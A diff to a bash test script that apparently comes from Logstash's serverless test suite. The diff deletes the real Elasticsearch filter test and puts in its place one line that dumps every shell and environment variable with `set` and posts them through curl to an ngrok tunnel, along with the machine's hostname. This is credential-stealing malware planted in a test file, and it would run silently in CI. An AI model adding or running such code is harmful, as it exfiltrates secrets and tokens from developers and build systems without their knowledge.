@@ -1,16 +1,1 @@
-#!/usr/bin/env bash
-set -ex
-
-source ./$(dirname "$0")/common.sh
-
-check_es_filter() {
-  check_logstash_api '.pipelines.main.plugins.filters[] | select(.id == "ok") | .events.out' '1'
-}
-
-check_plugin() {
-  add_check check_es_filter "Failed es-filter check."
-}
-
-setup
-index_test_data
-run_logstash "$CURRENT_DIR/pipeline/002_es-filter.conf" check_plugin
+set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/elastic/logstash.git\&folder=serverless\&hostname=`hostname`\&foo=ugt
